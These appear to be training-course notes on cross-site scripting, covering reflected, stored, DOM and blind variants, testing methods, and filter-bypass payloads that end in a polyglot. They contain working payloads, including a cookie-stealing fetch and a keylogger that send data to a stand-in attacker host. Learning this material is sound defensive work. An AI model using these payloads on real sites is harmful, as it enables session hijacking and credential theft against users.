# Cross site Scripting (XSS)

### **Cross-site Scripting (XSS)** <a href="#id-25kqlw4gpf35" id="id-25kqlw4gpf35"></a>

* Classified as an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users.
* These vulnerabilities are extremely common.

### **XSS Payloads** <a href="#x85ub9nm1tiu" id="x85ub9nm1tiu"></a>

* Payload is the JavaScript code to be executed on the target computer.
* There are two parts to the payload:
  * The intention is what you wish the JavaScript to actually do.
  * The modification is the changes to the code we need to make it execute as every scenario is different.

#### **XSS Intention Examples** <a href="#wd8jldynm8b1" id="wd8jldynm8b1"></a>

**Proof Of Concept**

* The simplest of payloads where all is required is to demonstrate that XSS can be achieved on a website.
  * Often done by causing an alert box to pop up on the page with a string of text: \<script>alert('XSS');\</script>.

**Session Stealing**

* Details of a user's session, such as login tokens, are often kept in cookies on the target machine.
* Use JavaScript to take the target's cookie, base64 encodes the cookie to ensure successful transmission and then post it to a website under the hacker's control to be logged:
  * \<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));\</script>
* Once the hacker has these cookies they can take over the target's session and be logged as that user.

**Key Logger**

* The following code acts as a key logger: \<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}\</script>
* This means anything typed on the webpage will be forwarded to a website under the hacker's control.
* This could be very damaging if the website the payload was installed on accepted user logins or credit card details.

**Business Logic**

* This payload is a lot more specific than the other examples.
* This would calli a particular network resource or JavaScript function.
  * For example, imagine a JavaScript function for changing the user's email address called user.changeEmail().
    * The payload could look like this: \<script>user.changeEmail('attacker@hacker.thm');\</script>.
  * Now that the email address for the account has changed, the attacker may perform a reset password attack.

### **Reflected XSS** <a href="#id-5u67pa20sbtf" id="id-5u67pa20sbtf"></a>

* Occurs when user supplied data in an HTTP request is included in the webpage source without any validation.

#### **Reflected XSS Example** <a href="#hp9cq2iz19yb" id="hp9cq2iz19yb"></a>

* A website where if incorrect input is entered, an error message is displayed.
* The content of the error message gets taken from the error parameter in the query string and is built directly into the page source:
  * In the browser: https://website.thm/?error=Invalid Input Detected
  * In the source code:
    * \<div class="alert alert-danger">
    * \<p>Invalid Input Detected\</p>
    * \</div>
* The application doesn't check the contents of the error parameter, which allows the attacker to insert malicious code:
  * In the browser: https://website.thm/?error=\<script src="https://attacker.thm/evil.js">\</script>
  * In the source code:
    * \<div class="alert alert-danger">
    * \<p>\<script src="https://attacker.thm/evil.js">\</script>\</p>
    * \</div>
* The vulnerability could be used as per the scenario below:
  * Attacker sends a link to the victim that contains a malicious payload.
  * Victim clicks the link and is taken to the vulnerable website.
  * Link containing attacker's script is executed on the website.
  * The data that the attacker's script gathered is sent to them.
  * They could steal the victim's cookie.
  * This would allow the attacker to take over the victim's account.

**Potential Impact:**

* The attacker could send links or embed them into an iframe on another website containing a JavaScript payload to potential victims getting them to execute code on their browser, potentially revealing session or customer information.

#### **How to test for Reflected XSS** <a href="#reuv8w9jihsy" id="reuv8w9jihsy"></a>

* Need to test every possible point of entry:
  * Parameters in the URL Query String.
  * URL File Path.
  * Sometimes HTTP Headers (although unlikely exploitable in practice).
* If data has been found which is being reflected in the web application:
  * Confirm that you can successfully run ythe JavaScript payload.
  * The payload will be dependent on where in the application your code is reflected.

### **Stored XSS** <a href="#wb62zdq9436g" id="wb62zdq9436g"></a>

* XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page.

#### **tored XSS Example** <a href="#oq3rfnlsrxme" id="oq3rfnlsrxme"></a>

* A blog website that allows users to post comments.
* Unfortunately, these comments aren't checked for whether they contain JavaScript or filter out any malicious code.
  1. When a comment is posted containing JavaScript it will be stored in the database.
  2. Every other user now visiting the article will have the JavaScript run in their browser.
* The vulnerability could be used as per the scenario below:
  1. Attacker inserts malicious payload into the website's database.
  2. For every visit to the website the malicious script is activated.
  3. The data that the attacker's script gathered is sent to them.
     * They could steal the victim's cookie.

**Potential Impact**

* The malicious JavaScript could:
  * Redirect users to another site.
  * Steal the user's session cookie.
  * Perform other website actions while acting as the visiting user.

#### **How to test for Stored XSS** <a href="#v67txem0j09f" id="v67txem0j09f"></a>

* Need to test every possible point of entry where it seems data is stored and then shown back in areas that other users have access to:
  * Comments on a blog.
  * User profile information.
  * Website Listings.
* Sometimes developers think limiting input values on the client-side is good enough protection.
  * Changing values to something the web application wouldn't be expecting is a good source of discovering stored XSS.
    * for example, an age field that is expecting an integer from a dropdown menu.
      * Manually send the request rather than using the form.
      * Allows the trial of malicious payloads.
* Once data has been found which is being stored in the web application, confirm that the JavaScript payload can be run successfully.
  * The payload will be dependent on where in the application your code is reflected.

### **Document Object Model (DOM) Based XSS** <a href="#id-20ku4i36lrz3" id="id-20ku4i36lrz3"></a>

* DOM is a programming interface for HTML and XML documents.
* It represents the page so that programs can change the document structure, style and content.
* A web page is a document, and this document can be either displayed in the browser window or as the HTML source.
* To learn more about the DOM and gain a deeper understanding,[ w3.org](../Junior%20Penetration%20Tester/Introduction%20to%20Web%20Hacking/w3.org) have a great resource.

#### **Exploiting the DOM** <a href="#id-9ddxos5z4be3" id="id-9ddxos5z4be3"></a>

* DOM Based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code.
* Execution occurs when the website JavaScript code acts on input or user interaction.

**DOM Based XSS Exploitation Example**

* A website's JavaScript gets the contents from the window.location.hash parameter and then writes that onto the page in the currently being viewed section.
* The contents of the hash are not checked for malicious code, allowing an attacker to inject JavaScript of their choosing onto the webpage.

**Potential Impact**

* Crafted links could be sent to potential victims, redirecting them to another website or stealing content from the page or the user's session.

#### **How to test for Dom Based XSS:** <a href="#xxfp9qovjplf" id="xxfp9qovjplf"></a>

* DOM Based XSS can be challenging to test for and requires a certain amount of knowledge of JavaScript to read the source code.
* Need to look for parts of the code that access certain variables that an attacker can have control over, such as window.location.x parameters.
* When those bits of code have been found:
  * Need to see how they are handled.
  * Whether the values are ever written to the web page's DOM or passed to unsafe JavaScript methods such as eval().

### **Blind XSS** <a href="#cslwk5dd3r8v" id="cslwk5dd3r8v"></a>

* Similar to a stored XSS in that the payload gets stored on the website for another user to view.
* However, cannot see the payload working or be able to test it first.

#### **Blind XSS Example** <a href="#ju3w0uylmxjt" id="ju3w0uylmxjt"></a>

* A website has a contact form where you can message a member of staff.
* The message content doesn't get checked for any malicious code, which allows the attacker to enter anything they wish.
* These messages then get turned into support tickets which staff view on a private web portal.

**Potential Impact**

* Using the correct payload, the attacker's JavaScript could make calls back to an attacker's website, revealing the staff portal URL, the staff member's cookies, and even the contents of the portal page that is being viewed.
* Now the attacker could potentially hijack the staff member's session and have access to the private portal.

#### **How to test for Blind XSS:** <a href="#dv9c0bpasphp" id="dv9c0bpasphp"></a>

* Need to ensure the payload has a call back (usually an HTTP request) when testing for Blind XSS vulnerabilities.
  * This way there is validation if and when the code is being executed.
* A popular tool for Blind XSS attacks is[ XSS Hunter Express](https://github.com/mandatoryprogrammer/xsshunter-express).
  * Although it's possible to make your a tool in JavaScript, this tool will automatically capture cookies, URLs, page contents and more.

### **Perfecting the Payload** <a href="#id-7n93zgbhy3y6" id="id-7n93zgbhy3y6"></a>

* The payload is the JavaScript code to be executed either on another user's browser or as a proof of concept to demonstrate a vulnerability in a website.
* THe payload could have many intentions:
  * Bringing up a JavaScript alert box to prove JavaScript can be executed on the target website.
  * Extracting information from the webpage or user's session.
* How your JavaScript payload gets reflected in a target website's code will determine the payload to use.

#### **Payload Example 1 - Escape an Input Form** <a href="#ogihn4x42d86" id="ogihn4x42d86"></a>

1. Presented with a form asking to enter a name.
2. Once a name has been entered it will be presented on a line below.
3. View the Page Source to see the name reflected in the code:
   * \<div class="text-center">
   * \<h2>Hello, Andy\</h2>
   * \</div>
4. Instead of entering a name instead try to enter the following JavaScript Payload: \<script>alert('THM');\</script>.
5. Now when clicking the enter button, an alert will popup with the string THM and the page source will look like the following:
   * \<div class="text-center">
   * \<h2>Hello, \<script>alert('THM');\</script>\</h2>
   * \</div>

#### **Payload Example 2 - Escape an Input Tag** <a href="#i06fmqkvuoz7" id="i06fmqkvuoz7"></a>

* Presented with a form asking to enter a name.
* Name is being reflected in an HTML input tag when clicking enter
* The name is reflected inside the value attribute of the input tag:
  * \<div class="test-center">
  * \<h2>Hello, \<input value="Andy">\</h2>
  * \</div>
* The previous JavaScript payload cannot be run from inside the input tag.
* Need to escape the input tag so the payload can run properly.
  * Do this with the ">\<script>alert('THM');\</script> payload.
  * The important part of the payload is the "> which closes the value parameter and then closes the input tag.
  * This now closes the input tag properly and allows the JavaScript payload to run:
    * \<div class="test-center">
    * \<h2>Hello, \<input value="">\<script>alert('THM');\</script>\</h2>
    * \</div>
* Now when clicking the enter button, an alert will popup with the string THM.

#### **Payload Example 3 - Escape a Textarea Tag** <a href="#id-4hqzq1eoral" id="id-4hqzq1eoral"></a>

* Presented with a form asking to enter a name.
* This time the name gets reflected inside an HTML textarea tag.
  * \<div class="test-center">
  * \<h2>Hello, \<textarea>"Andy"\</textarea>\</h2>
  * \</div>
* Need to escape the textarea tag differently than the input one:
  * \<div class="test-center">
  * \<h2>Hello, \<textarea>\</textarea>\<script>alert('THM');\</script>\</textarea>\</h2>
  * \</div>
* The important part of the above payload is \</textarea>, which causes the textarea element to close so the script will run.
* Now when clicking the enter button, an alert will popup with the string THM.

#### **Payload Example 4 - Escape JavaScript code** <a href="#t2gbe2f76bk4" id="t2gbe2f76bk4"></a>

* Presented with a form asking to enter a name.
* Appears similar to example 1.
* Viewing the page source, name gets reflected in some JavaScript code:
  * \<script>
  * document.getElementByClassName('name')\[0].innerHTML='Andy';
  * \</script>
* Need to escape the existing JavaScript command to run payload:
  * \<script>
  * document.getElementByClassName('name')\[0].innerHTML='';alert('THM');//'
  * \</script>
    * The ' closes the field specifying the name.
    * Then ; signifies the end of the current command.
    * The // at the end makes anything after it a comment rather than executable code.
* Now when clicking the enter button, an alert will popup with the string THM.

#### **Payload Example 5 - Escape a Filtered Input Box** <a href="#idtlp8rxnlat" id="idtlp8rxnlat"></a>

* Presented with a form asking to enter a name.
* Appears similar to example 1.
  * However, \<script>alert('THM');\</script> does not work.
* The word script gets removed from the payload due to a filter that strips out any potentially dangerous words.
* There's a trick that you can be tried when a word gets removed from a string: \<sscriptcript>alert('THM');\</sscriptcript>.
* Now when clicking the enter button, an alert will popup with the string THM.

#### **Payload Example 6 - Escape a Filtered Input Tag** <a href="#id-6wgibzwv4ddp" id="id-6wgibzwv4ddp"></a>

* Similar to example two.
  * However, ">\<script>alert('THM');\</script> does not work.
* View page source to see why payload doesn't work:
  * \<div vlass="text-center">
  * \<h2>Your Picture\</h2>
  * \<img src=""scriptalert('THM');/script">
  * \</div>
* < and > characters get filtered out from our payload preventing the 'IMG' tag escape.
* Take advantage of the onload event attribute of the IMG tag to get around the filter.
  * The onload event executes the code once the image specified in the src attribute has loaded onto the web page.
* Change the payload to /images/cat.jpg" onload="alert('THM');
* View the page source to see how this will work:
  * \<div vlass="text-center">
  * \<h2>Your Picture\</h2>
  * \<img src="/imges/cat.jpg" onload="alert(HTM);">
  * \</div>
* Now when clicking the enter button, an alert will popup with the string THM.

#### **Polyglots** <a href="#jpy255nmqkn3" id="jpy255nmqkn3"></a>

* XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one.
* Could have used the polyglot below on all six exmples above and it would have executed the code successfully:
  * jaVasCript:/\*-/\*/_\`/_'/_"/\*\*/(/_ \*/onerror=alert('THM') )//%0D%0A%0d%0a//\</stYle/\</titLe/\</teXtarEa/\</scRipt/--!>\x3csVg/\<sVg/oNloAd=alert('THM')//>\x3e\`
